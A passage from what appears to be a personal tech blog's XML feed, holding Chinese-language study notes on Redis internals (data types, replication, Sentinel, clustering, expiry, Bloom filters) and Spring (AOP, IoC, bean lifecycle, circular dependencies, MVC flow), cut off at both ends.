class="line">            example.foo(<span class="number">3</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;八锁、线程池、ThreadLocal&lt;/p&gt;</summary>
    
    
    
    <category term="Java基础" scheme="https://winkygranger.github.io/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="JUC" scheme="https://winkygranger.github.io/tags/JUC/"/>
    
  </entry>
  
  <entry>
    <title>Redis</title>
    <link href="https://winkygranger.github.io/2022/05/22/Redis/"/>
    <id>https://winkygranger.github.io/2022/05/22/Redis/</id>
    <published>2022-05-22T13:03:41.000Z</published>
    <updated>2023-01-19T07:52:15.159Z</updated>
    
    <content type="html"><![CDATA[<p>Redis数据类型、三种模式、淘汰策略</p><span id="more"></span><h1 id="5种数据类型"><a href="#5种数据类型" class="headerlink" title="5种数据类型"></a>5种数据类型</h1><p>Redis 在互联网产品中使用的场景实在是太多太多，这里分别对 Redis 几种数据类型做了整理：<br>1）<strong>String</strong>：缓存、限流、分布式锁、计数器、分布式 Session 等。<br>2）<strong>Hash</strong>：用户信息、用户主页访问量、组合查询等。<br>3）<strong>List</strong>：简单队列、关注列表时间轴。<br>4）<strong>Set</strong>：赞、踩、标签等。<br>5）<strong>有序集合 ZSet</strong>：排行榜、好友关系链表。<br>zset 是 Redis 中一个非常重要的数据结构，其底层是基于<strong>跳表（skip list）</strong> 实现的。<br><img src="/2022/05/22/Redis/1657602795682-73a331b2-61f8-438e-a0e2-204db9ef2c98.png"><br><img src="/2022/05/22/Redis/1657603080956-a546e707-6713-4a9a-85db-713ac9825836.png"><br>跳表是一种随机化的数据结构，基于并联的链表，实现简单，插入、删除、查找的复杂度均为 O(logN)。简单说来跳表也是链表的一种，只不过它在链表的基础上增加了跳跃功能，正是这个跳跃的功能，使得在查找元素时，跳表能够提供 O(logN) 的时间复杂度。<br>跳表为了避免每次插入或删除带来的额外操作，<code>不要求上下相邻两层链表之间的节点个数有严格的对应关系，而是为每个节点随机出一个层数（level)</code>。而且新插入一个节点不会影响其它节点的层数。因此，插入操作只需要修改插入节点前后的指针，而不需要对很多节点都进行调整。</p><h1 id="zset为何不使用红黑树等平衡树？"><a href="#zset为何不使用红黑树等平衡树？" class="headerlink" title="zset为何不使用红黑树等平衡树？"></a>zset为何不使用红黑树等平衡树？</h1><p>1）<strong>跳跃表范围查询比平衡树操作简单。</strong> 因为平衡树在查询到最小值的时还需要采用中序遍历去查询最大值。 而跳表只需要在找到最小值后，对第一层的链表遍历即可。<br>2）<strong>平衡树的删除和插入需要对子树进行相应的调整</strong>，而跳表只需要修改相邻的节点即可。<br>3）跳表和平衡树的查询操作都是O（logN）的时间复杂度。<br>4）从整体上来看，跳表算法实现的难度要低于平衡树。</p><h1 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h1><h2 id="1-全量复制"><a href="#1-全量复制" class="headerlink" title="1.全量复制"></a>1.全量复制</h2><p>发生节点: 在slave 从服务器初始化阶段，需要将master主服务器上的所有数据都复制一份，流程如下：</p><ul><li>从服务器连接主服务器，并发送sycn命令</li><li>主服务器接收到sycn命令后，执行bgsave命令生成RDB文件，并且在缓冲区中记录之后所有的操作记录</li><li>master执行完bgsave后，master将RDB文件发送给slave，并在此阶段内继续在缓冲区内写操作</li><li>slave在接收到RDB文件前 ，会将自身的数据全部丢弃，载入RDB</li><li>master发送完毕，会向slave 的缓冲区发 写入执行命令</li><li>slave 完成对RDB的载入，开始接受命令请求，并执行缓冲区的命令</li></ul><h2 id="2-增量复制"><a href="#2-增量复制" class="headerlink" title="2.增量复制"></a>2.增量复制</h2><p>其中有三个重要参数：</p><ul><li>主服务器的偏移量和从服务器的<strong>复制偏移量（offset）</strong></li><li>主服务器的<strong>复制积压缓冲区</strong></li><li>服务器的<strong>运行ID（runID）</strong></li></ul><h4 id="复制偏移量"><a href="#复制偏移量" class="headerlink" title="复制偏移量"></a><code>复制偏移量</code></h4><p>主节点和从节点分别维护一个复制偏移量（offset），代表的是<strong>主节点向从节点传递的字节数</strong><br>offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。<br>例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。</p><h4 id="复制积压缓冲区"><a href="#复制积压缓冲区" class="headerlink" title="复制积压缓冲区"></a><code>复制积压缓冲区</code></h4><p>复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。<br>在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。</p><p>从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：</p><ul><li>如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；</li><li>如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。</li></ul><h1 id="哨兵模式"><a href="#哨兵模式" class="headerlink" title="哨兵模式"></a>哨兵模式</h1><h2 id="哨兵模式下主观下线-客观下线"><a href="#哨兵模式下主观下线-客观下线" class="headerlink" title="哨兵模式下主观下线/客观下线"></a>哨兵模式下主观下线/客观下线</h2><ul><li><p>在默认情况下，Sentinel会以每秒一次的频率向所有与他创建了连接的实例（包括主服务器、从服务器、其他Sentinel）发送PING命令，通过PING的返回值判断实例是否在线</p></li><li><p>回复+PONG、-LOADING、-MASTERDOWN、则有效</p></li><li><p>除以上三个之外的回复或者规定时间内down-after-milliseconds时间内没有回复则主观下线</p></li><li><p>当判断主观下线后，会对其他Sentinel进行询问，当一半以上觉得主观下线的话，视为客观下线</p><h2 id="选出新的主服务器"><a href="#选出新的主服务器" class="headerlink" title="选出新的主服务器"></a>选出新的主服务器</h2></li><li><p>先判断slave节点与master节点断开的时长，如果超过指定（down-after-milliseconds * 10）则会排除该节点</p></li><li><p>判断slave节点的slave-priority,数字越小优先级越高，0则是用不参加选举</p></li><li><p>如果有多个相同最高优先级的，则选出其中偏移量offset最大的从服务器</p></li><li><p>最后判断运行ID，选出ID最小的服务器</p><h2 id="故障转移"><a href="#故障转移" class="headerlink" title="故障转移"></a>故障转移</h2></li><li><p>选中以后，sentinel会给备选的slave发送slaveof no one，让该节点变为master</p></li><li><p>广播其他从节点，发送slaveof 新的ip 新的端口号给其他的从节点，让这些slave成为新的master的从节点，开始从新的master上同步数据</p></li><li><p>sentinel将故障节点标记为slave，当故障节点恢复后会自动成为新的master的slave（直接修改配置文件为slaveof 新的ip 新的端口号）</p></li></ul><h1 id="集群模式"><a href="#集群模式" class="headerlink" title="集群模式"></a>集群模式</h1><h2 id="哈希槽"><a href="#哈希槽" class="headerlink" title="哈希槽"></a>哈希槽</h2><p>Redis集群通过分片的方式保存键值对：集群被分为16384个槽（slot），数据库中每个键都属于其中的一个。每个槽都必须有节点在处理。</p><ul><li>数据key不与节点绑定，而是与插槽绑定。</li><li>key中包含{}且至少有一个字符，则{}中为有效部分</li><li>不包含{}则 key 都是有效部分<ul><li>key是{itcast}num，根据itcast计算，计算方式是CRC16算法得到一个hash值，然后%16384得到最后slot</li></ul></li></ul><h1 id="删除机制"><a href="#删除机制" class="headerlink" title="删除机制"></a>删除机制</h1><h2 id="惰性删除"><a href="#惰性删除" class="headerlink" title="惰性删除"></a><code>惰性删除</code></h2><p>在读写key时才判断是否过期，如果过期就删除掉，属于将删除环节后置了，这样避免了轮询但是要增加了内存的占用。极端情况下如果某些体积非常大的key一直没有被访问，那么将占用内存很久，无疑在内存紧张的情况下对性能产生影响</p><h2 id="定期删除"><a href="#定期删除" class="headerlink" title="定期删除"></a><code>定期删除</code></h2><p>在主节点执行ServerCron任务定时扫描需要被删掉的key，节约了空间，但是使用了轮询消耗一定的CPU，因此在需要被删除键很多且CPU资源不富裕的情况下，对Redis服务的性能会产生影响。</p><h2 id="定时删除"><a href="#定时删除" class="headerlink" title="定时删除"></a><code>定时删除</code></h2><p>在设置键的过期时间的同时，创建一个定时器（timer），让定时器在键的过期时间来临时，立即执行对键的删除操作。不现实。浪费cpu</p><p>在实际中Redis将惰性删除作为默认开启，定期删除可以通过配置来进行设定删除频率和内存阈值触发等，算是个折中的选择</p><ul><li><code>**单线程删除阻塞问题**</code></li></ul><p>Redis作为一个单线程模型的服务，当执行一些耗时的命令时，比如使用DEL删除一个value特别大的key时，或使用FLUSHDB 和 FLUSHALL 进行清库操作，都会造成redis阻塞，从而降低性能甚至发生故障转移</p><ul><li><code>**异步删除命令**</code></li></ul><p><strong>UNLINK</strong>是<strong>DEL</strong>的异步删除版本，<strong>UNLINK</strong>命令与<strong>DEL</strong>阻塞删除不同，<strong>UNLINK</strong>在删除集合类键时，如果集合键的元素个数大于64个，会把真正的内存释放操作，给单独的<strong>BackgroundIO</strong>线程来操作，有实验表明使用<strong>UNLINK</strong>命令删除一个大键mylist, 它包含200万个元素，但用时只有数毫秒。</p><p>通过对<strong>FLUSHALL/FLUSHDB</strong>添加<strong>ASYNC</strong>异步清理选项，redis在清理整个实例或DB时，操作也都是异步的，有实验数据表明异步清理200w数据耗时也只有数毫秒。</p><p>综上可知，采用<strong>UNLINK、FLUSHALL、FLUSHDB</strong>代替之前的阻塞删除命令可以使处理相同数据的耗时从传统秒级、甚至分钟级降低到目前的微妙，毫秒级，确实是个巨大的飞跃，或许这也是Redis直接从3.x飞跃到4.0的原因。</p><h1 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h1><p>假如现在有三个哈希函数分别为**h1,h2,h3,**同时有三个输入x,y,z。三个输入分别通过h1-h3进行哈希计算出对应整数之后，对bitarray的长度进行取模运算，获取对应下标再进行置1，这样运算三次就形成了如图的bitmap结构：<br><img src="/2022/05/22/Redis/1617902398292-857d3496-ce3e-4032-a625-7d856d8ea1bf.jpeg"><br>布隆过滤器检索时，使用相同的哈希函数进行计算出对应的bit位置，只要看这些位置的值，如果这些位置有任何一个0，则被检元素一定不在；如果都是1，则被检元素可能存在。</p><p><strong>一句话概率就是有0一定不存在、全1不一定存在。</strong><br><strong>不支持删除值，可以通过业务逻辑排除</strong></p><p><strong>误算率</strong>是其中之一，随着存入的元素数量增加，误算率随之增加，但是如果元素数量太少，则使用散列表足够。另外一般情况下不能从布隆过滤器中删除元素。</p><h1 id="Redis淘汰策略"><a href="#Redis淘汰策略" class="headerlink" title="Redis淘汰策略"></a>Redis淘汰策略</h1><p><img src="/2022/05/22/Redis/1660377928465-7017961a-eaf5-4857-827c-68d7b3ce8e8a.png"></p><h1 id="Redis为什么采用跳表而不是红黑树"><a href="#Redis为什么采用跳表而不是红黑树" class="headerlink" title="Redis为什么采用跳表而不是红黑树"></a>Redis为什么采用跳表而不是红黑树</h1><p>在做范围查找的时候，平衡树比skiplist操作要复杂。<br>在平衡树上，我们找到指定范围的小值之后，还需要以中序遍历的顺序继续寻找其它不超过大值的节点。<br>如果不对平衡树进行一定的改造，这里的中序遍历并不容易实现。而在skiplist上进行范围查找就非常简单，只需要在找到小值之后，对第1层链表进行若干步的遍历就可以实现。</p><p>平衡树的插入和删除操作可能引发子树的调整，逻辑复杂，而skiplist的插入和删除只需要修改相邻节点的指针，操作简单又快速。<br>从内存占用上来说，skiplist比平衡树更灵活一些。</p><p>一般来说，平衡树每个节点包含2个指针（分别指向左右子树），而skiplist每个节点包含的指针数目平均为1/(1-p)，具体取决于参数p的大小。如果像Redis里的实现一样，取p=1/4，那么平均每个节点包含1.33个指针，比平衡树更有优势。</p><p>查找单个key，skiplist和平衡树的时间复杂度都为O(log n)，大体相当；而哈希表在保持较低的哈希值冲突概率的前提下，查找时间复杂度接近O(1)，性能更高一些。所以我们平常使用的各种Map或dictionary结构，大都是基于哈希表实现的。<br>从算法实现难度上来比较，skiplist比平衡树要简单得多。</p><h1 id="Redis为什么这么快"><a href="#Redis为什么这么快" class="headerlink" title="Redis为什么这么快"></a>Redis为什么这么快</h1><p>Redis基于Reactor模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）：</p><ul><li>文件事件处理器使用I/O多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。</li><li>当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。</li></ul><p><strong>1、完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)；</strong><br><strong>2、数据结构简单，对数据操作也简单，Redis中的数据结构是专门进行设计的；</strong><br><strong>3、采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗；</strong><br><strong>4、使用多路I/O复用模型，非阻塞IO；</strong><br>多路I/O复用模型是利用 select、poll、epoll 可以同时监察多个流的 I/O 事件的能力，在空闲的时候，会把当前线程阻塞掉，当有一个或多个流有 I/O 事件时，就从阻塞态中唤醒，于是程序就会轮询一遍所有的流（epoll 是只轮询那些真正发出了事件的流），并且只依次顺序的处理就绪的流，这种做法就避免了大量的无用操作。<br>这里“多路”指的是多个网络连接，“复用”指的是复用同一个线程。采用多路 I/O 复用技术可以让单个线程高效的处理多个连接请求（尽量减少网络 IO 的时间消耗），且 Redis 在内存中操作数据的速度非常快，也就是说内存内的操作不会成为影响Redis性能的瓶颈，主要由以上几点造就了 Redis 具有很高的吞吐量。<br><strong>5、使用底层模型不同，它们之间底层实现方式以及与客户端之间通信的应用协议不一样，Redis直接自己构建了VM 机制 ，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求；</strong></p><h1 id="动态字符串SDS（保存单个字符串）"><a href="#动态字符串SDS（保存单个字符串）" class="headerlink" title="动态字符串SDS（保存单个字符串）"></a>动态字符串SDS（保存单个字符串）</h1><p><img src="/2022/05/22/Redis/1658822164633-4e762444-3f42-4025-a4a0-eefccb5eb3bd.png"></p><h1 id="IntSet（整数集合）"><a href="#IntSet（整数集合）" class="headerlink" title="IntSet（整数集合）"></a>IntSet（整数集合）</h1><p><img src="/2022/05/22/Redis/1658823208327-489b82c8-4e99-4088-b7d8-556f3dcc01a5.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Redis数据类型、三种模式、淘汰策略&lt;/p&gt;</summary>
    
    
    
    <category term="后端开发" scheme="https://winkygranger.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Redis" scheme="https://winkygranger.github.io/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>Spring</title>
    <link href="https://winkygranger.github.io/2022/05/22/Spring/"/>
    <id>https://winkygranger.github.io/2022/05/22/Spring/</id>
    <published>2022-05-22T13:03:41.000Z</published>
    <updated>2023-01-18T15:03:26.023Z</updated>
    
    <content type="html"><![CDATA[<p>Spring、Mybatis</p><span id="more"></span><h1 id="谈谈对AOP的理解"><a href="#谈谈对AOP的理解" class="headerlink" title="谈谈对AOP的理解"></a>谈谈对AOP的理解</h1><ul><li>系统是由许多不同的组件所组成的，每一个组件各负责一块特定功能。除了实现自身校心功能之外，这些组件还经常承担者额外的指责。例如日志，事务管理和安全这样的核心服务经第融入到自身具有校心业务理相的组件中去。这些系统服务经第被称为横切关注点，因为它们会路越系統的多个组件。</li><li>当我们需要为分散的对象引入公共行为的时候，OOP则显得无能为力，也就是说，OOP允许你定义从上到下的关系，但井不适合定义从左到右的关系，例如日志功能。</li><li>日志代码往往水平地散布在所有层次中，而与它所散布到的对象的校心功能无关系。</li><li>在OOP设计中，已导致了大量代码的重复，而不利于各个模块的重用。</li><li>AOP：将程序中的交叉业务设得(比如安全，日志，事务等），封装成一个切面，然后注入到目标对象（具体业务逻得）中去。AOP可以对某个对象或某些对象的功能进行增强，比如对象中的方法进行增强，可以在执行某个方法之前额外的做一些事情，在某个方法执行之后额外的做一些事情<h1 id="AOP有哪些实现方式"><a href="#AOP有哪些实现方式" class="headerlink" title="AOP有哪些实现方式"></a>AOP有哪些实现方式</h1></li></ul><p>AOP是通过动态代理实现的，代理模式是一种设计模式，它提供了对目标对象额外的访问方式，即通过代理对象来访问目标对象，这样可以在不修改原目标对象的情况下提供额外的功能。<br>静态代理与动态代理区别：</p><ul><li><p>静态代理在编译时就实现了，编译完后是一个实际的.class文件。</p></li><li><p>动态代理是运行时生成的，即编译完以后没有实际的.class文件，而是生成类字节码，并加载到jvm中。</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2></li><li><p>指使用 AOP 框架提供的命令进行编译，从而在编译阶段就可生成 AOP 代理类，因此也称为编译时增强;</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2></li><li><p>在运行时在内存中“临时”生成 AOP 动态代理类，因此也被称为运行时增强。</p><ul><li>JDK 动态代理：通过反射来接收被代理的类，并且要求被代理的类<strong>必须实现一个接口</strong>。JDK动态代理的核心是 InvocationHandler 接口和 Proxy 类。</li><li>CGLIB 动态代理：如果月标类没有实现接口，那么spring AoP 会选择使用 CGLIB 来动态代理目标类。CGLIB(Code Generation Library），是一个代码生成的类库，可以在运行时动态的生成某个类的子类，注意， CGLIB 是通过<strong>继承的方式</strong>做的动态代理，因此如果某个类被标记为 final，那么它是无法使用CGLTB 做动态代理的。</li></ul></li></ul><h1 id="谈谈对IOC的理解"><a href="#谈谈对IOC的理解" class="headerlink" title="谈谈对IOC的理解"></a>谈谈对IOC的理解</h1><p><strong>容器概念、控制反转、依赖注入</strong></p><h2 id="IOC容器："><a href="#IOC容器：" class="headerlink" title="IOC容器："></a>IOC容器：</h2><ul><li><p>实际上就是个map (key， value），里面存的是各种对象（在xml里配置的bean节点、@repository、@service.@controller. @component)，在项目启动的时候会读取配置文件里面的bean节点，根据全限定类名使用反射创建对象放到map里、扫描到打上上述注解的类还是通过反射创建对象放到map里</p></li><li><p>这个时候map里就有各种对象了，接下来我们在代码里需要用到里面的对象时，再通过DI注入 (autowired、resource等注解，xml里bean节点内的ref属性，项目启动的时候会读取xml节点ref厲性根据id注入，也会扫描这些注解，根据类型或id注入；id就是对象名）。</p><h2 id="控制反转："><a href="#控制反转：" class="headerlink" title="控制反转："></a>控制反转：</h2></li><li><p>没有引入IOC容器之前，对象A依赖于对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上</p></li><li><p>引入IOC容器之后，对象A与对象B之间失去了直接联系，<strong>当对象A运行到需要对象B的时候，IOC容器会主动创建一个对象B注入到对象A需要的地方</strong>。通过前后的对比，不难看出来：对象A获得依赖对象B的过程,由主动行为变为了被动行为，控制权颠倒过来了，这就是控制反转这个名称的由来。</p></li><li><p>全部对象的控制权全部上缴给”第三方”IOC容器，所以，IOC容器成了整个系统的关键核心，它起到了一种类似”粘合剂”的作用，把系统中的所有对象粘合在一起发挥作用，如果没有这个”粘合剂”，对象与对象之间会彼此失去联系，这就是有人把IOC容器比喻成”粘合剂”的由来。</p><h2 id="依赖注入："><a href="#依赖注入：" class="headerlink" title="依赖注入："></a>依赖注入：</h2></li><li><p>获得依赖对象的过程被反转了。控制被反转之后，获得依赖对象的过程由自身管理变为了由IOC容器主动注入。依赖注入是实现IOC的方法，就是由容器在运行期间，动态地将某种依赖注入到对象之中。</p><h1 id="Spring加载Bean的过程"><a href="#Spring加载Bean的过程" class="headerlink" title="Spring加载Bean的过程"></a>Spring加载Bean的过程</h1><p>bean的定义信息：xml 注解<br><img src="/2022/05/22/Spring/1657695101824-f4745b45-8fbd-46af-a9d5-0da9daeb15a7.jpeg"></p></li></ul><h1 id="BeanFactory-FactoryBean区别"><a href="#BeanFactory-FactoryBean区别" class="headerlink" title="BeanFactory FactoryBean区别"></a>BeanFactory FactoryBean区别</h1><p>BeanFactory：必须遵循完整的Bean生命周期去创建对象，<strong>流水线式创建</strong>。<br>FactoryBean：创建对象但是没有标准的流程，<strong>类似私人定制</strong>。</p><ul><li>isSingleton 判断是否单例</li><li>getObjectType 返回对象的类型</li><li>getObject 返回对象<h1 id="Spring-Bean的生命周期"><a href="#Spring-Bean的生命周期" class="headerlink" title="Spring Bean的生命周期"></a>Spring Bean的生命周期</h1></li></ul><p><strong>创建前准备、创建实例、依赖注入、容器缓存、销毁实例</strong></p><ul><li><p> Spring 容器 从 XML 文件中读取 bean 的定义BeanDefinition，并<strong>实例化 bean</strong>。 </p></li><li><p> Spring 根据 bean 的定义填充所有的属性（对对象中加入Autowried注解的属性进行<strong>自定义属性填充</strong>）。</p></li><li><p>调用Aware方法，如果 bean 实现了 BeanNameAware 接口，Spring 传递 bean 的 ID 到 setBeanName 方法；如果 Bean 实现了 BeanFactoryAware 接口， Spring 传递 beanfactory 给 setBeanFactory 方法。（<strong>设置容器属性</strong>） </p></li><li><p>如果有任何与 bean 相关联的 BeanPostProcessors，Spring 会在 postProcesserBeforeInitialization()方法内调用它们。（初始化前的方法）</p></li><li><p>如果 bean 实现 IntializingBean 了，调用它的 afterPropertiesSet 方法， 如果 bean 声明了初始化方法，<strong>调用此初始化方法</strong>。 （初始化方法）</p></li><li><p>如果有 BeanPostProcessors 和 bean 关联，这些 bean 的 postProcessAfterInitialization() 方法将被调用。 （初始化后方法，这里会进行AOP）</p></li><li><p>如果当前创建的bean是单例的，把bean放入单例池</p></li><li><p>使用bean</p></li><li><p>如果 bean 实现了 DisposableBean，它将调用 destroy()方法。  </p><h1 id="什么是Bean的自动装配，有哪些方式"><a href="#什么是Bean的自动装配，有哪些方式" class="headerlink" title="什么是Bean的自动装配，有哪些方式"></a>什么是Bean的自动装配，有哪些方式</h1><p>Spring 容器能够自动装配相互合作的 bean，这意味着容器不需要和配置，能通 过 Bean 工厂自动处理 bean 之间的协作。  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">&quot;book&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.xxx.xxx.Book&quot;</span> <span class="attr">autowrire</span> = <span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> no：默认的方式是不进行自动装配，通过显式设置 ref 属性来进行装配。  </p></li><li><p> byName：通过参数名 自动装配，Spring 容器在配置文件中发现 bean 的 autowire 属性被设置成 byname，之后容器试图匹配、装配和该 bean 的属性具有相同名字的 bean。  </p></li><li><p> byType：通过参数类型自动装配，Spring 容器在配置文件中发现 bean 的 autowire 属性被设置成 byType，之后容器试图匹配、装配和该 bean 的属性具有相同类型的 bean。如果有多个 bean 符合条件，则抛出错误，使用@Qualifire注解指定 一个去注入。</p></li><li><p> constructor：这个方式类似于 byType， 但是要提供给构造器参数，如果没有确定的带参数的构造器参数类型，将会抛出异常。 </p></li><li><p>autodetect：首先尝试使用 constructor 来自动装配，如果无法工作， 则使用 byType 方式。  </p><h1 id="Spring中的Bean是线程安全的吗"><a href="#Spring中的Bean是线程安全的吗" class="headerlink" title="Spring中的Bean是线程安全的吗"></a>Spring中的Bean是线程安全的吗</h1><p>Spring本身并没有针对Bean做线程安全的处理，所以</p></li><li><p>如果Bean是无状态的，则Bean是线程安全的</p></li><li><p>有状态，则不安全</p></li></ul><p>另外，Bean是不是线程安全跟Bean作用域没关系，Bean作用域只是表示Bean生命周期的范围</p><h1 id="Spring支持的几种bean的作用域"><a href="#Spring支持的几种bean的作用域" class="headerlink" title="Spring支持的几种bean的作用域"></a>Spring支持的几种bean的作用域</h1><ul><li>singleton : bean在每个Spring ioc 容器中只有一个实例。单例模式由BeanFactory自身来维护。该对象的生命周期和IOC一致。（在第一次被注入时才会被创建）</li><li>prototype：为每一个bean请求提供一个实例。在每次注入时都会创建一个新的对象。</li><li>request：每次http请求都会创建一个bean，该作用域仅在基于web的Spring ApplicationContext情形下有效。</li><li>session：在一个HTTP Session中，一个bean定义对应一个实例。session过期以后bean会随之失效</li><li>global-session：在一个全局的HTTP Session中，一个bean定义对应一个实例。该作用域仅在基于web的Spring ApplicationContext情形下有效。</li></ul><p>注意： 缺省的Spring bean 的作用域是Singleton。使用 prototype 作用域需要慎重的思考，因为频繁创建和销毁 bean 会带来很大的性能开销。</p><h1 id="Spring用到哪些设计模式"><a href="#Spring用到哪些设计模式" class="headerlink" title="Spring用到哪些设计模式"></a>Spring用到哪些设计模式</h1><h1 id="Spring如何解决循环依赖"><a href="#Spring如何解决循环依赖" class="headerlink" title="Spring如何解决循环依赖"></a>Spring如何解决循环依赖</h1><p>关键词：<strong>三级缓存、提前暴露对象、AOP</strong></p><ul><li><p>总：什么是循环依赖？ </p><ul><li>A有b属性，B有a属性</li><li>bean的创建过程是先实例化–&gt;初始化</li><li>A在实例化后初始化时b属性为空，去容器中找B对象 <ul><li>有B，不存在循环依赖</li><li>无B，创建B，填充a属性 —&gt;容器中去找A 找不到</li></ul></li></ul></li><li><p>仔细思考发现A对象是存在的，不过不是一个完整状态，只完成了实例化，没有完成初始化。如果调用了某个对象的引用，后期可以先把非完整状态赋值，等后续操作来完成赋值，相当于<strong>提前</strong>暴露了某个不完整对象的引用。所以解决问题的核心在于实例化和初始化分开操作</p></li><li><p>当所有对象都完成操作实例化之后，还要把对象放入容器中，此时容器中的对象有两个状态 </p><ul><li>实例化完成但未初始化完成</li><li>实例化初始化都完成</li></ul></li><li><p>这两种对象都在容器中，所以要用不同的map结构来进行存储，此时就有一级缓存和二级缓存 </p><ul><li>一级缓存放完整的对象</li><li>二级缓存放非完整对象</li></ul></li><li><p>三级缓存中的value类型是<code>ObjectFactory</code>函数式接口，存在的意义是保证在容器中同名的bean对象只有一个，一个对象如果要被代理，或者说要生成代理对象，那么先需要一个普通对象。普通对象和代理对象不能同时出现在容器中，因此一个对象需要被代理时就需要使用代理对象去覆盖之前的普通对象，在实际调用中是没有办法确定什么时候对象被调用，所以就需要当某个对象被调用时优先判断此对象是否需要被代理，类似一种回调机制的实现，因此传入lambda表达式时可以通过lambda表达式来执行对象覆盖过程</p></li><li><p>因此所有bean对象在创建时都放在三级缓存中，后续使用中需要被代理则返回代理对象，不需要则返回普通对象</p><h1 id="Spring事务的实现及隔离级别"><a href="#Spring事务的实现及隔离级别" class="headerlink" title="Spring事务的实现及隔离级别"></a>Spring事务的实现及隔离级别</h1><p>有两种使用事务的方式：<strong>编程式和申明式</strong></p></li><li><p>编程式就是调用一些<code>API</code></p></li><li><p>申明式例如<code>@Transaction（rollback = “”）</code></p></li></ul><p>Spring事务隔离级别就是数据库的隔离级别。如果数据库配置RC，Spirng配置RR，则以Spring配置为准，如果Spring设置的隔离级别数据库不支持，那么以数据库为准。</p><h1 id="Spring-Boot、MVC、Spring区别"><a href="#Spring-Boot、MVC、Spring区别" class="headerlink" title="Spring Boot、MVC、Spring区别"></a>Spring Boot、MVC、Spring区别</h1><ul><li>spring是一个lOC容器，用来管理Bean，使用依赖注入实现控制反转，可以很方便的整合各种框架，提供AOP机制弥补OOP的代码重复问题、更方便将不同类不同方法中的共同处理抽取成切面、自动注入给方法执行，比如日志、异常等</li><li>springmvc是spring对web框架的一个解决方案，提供了一个总的前端控制器Servlet，用来接收请求，然后定义了一套路由策略(url到handle的映射)及适配执行handle，将handle结果使用视图解析技术生成视图展现给前端</li><li>springboot是spring提供的一个快速开发工具包，让程序员能更方便、更快速的开发spring+springmvc应用，简化了配置(约定了默认配置)，整合了一系列的解决方案(starter机制) 、 redis、mongodb、es，可以开箱即用<h1 id="Spring-MVC工作流程"><a href="#Spring-MVC工作流程" class="headerlink" title="Spring MVC工作流程"></a>Spring MVC工作流程</h1></li></ul><p><img src="/2022/05/22/Spring/1657373543471-ed458042-4315-4721-ada1-74bd612d0947.png" alt="image.png"></p><p>流程说明（重要）:</p><ul><li>客户端（浏览器）发送请求，直接请求到Dispatcherservlet。</li><li>Dispatcherservlet根据请求信息调用HandlerMapping，拿到控制链。&lt;url，handler&gt;的一个Map</li><li>Dispatcherservlet调用HandlerAdapter适配器处理</li><li>解析到对应的Handler(也就是我们平常说的Controller控制器）</li><li>Controller执行完成返回ModelAndView</li><li>HandlerAdapter会根据把ModelAndView返回给Dispatcherservlet</li><li>ViewResolver会根据逻辑view查找实际的view。</li><li>Dispaterservlet把返回的Model传给view（视图渲染）</li><li>把view返回给请求者（浏览器)</li></ul><p>Spring MVC主要组件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/22222537/1657374133666-5e0615ed-f2c6-4add-9d47-b14723f89b64.png#clientId=u33fedc44-1650-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u49a8df32&margin=%5Bobject%20Object%5D&name=image.png&originHeight=691&originWidth=629&originalType=binary&ratio=1&rotation=0&showTitle=false&size=199988&status=done&style=none&taskId=u36c8bfaa-b96f-40a7-9af1-d8834de7606&title=&width=630.2000122070312" alt="image.png"></p><h1 id="SpringBoot自动配置原理"><a 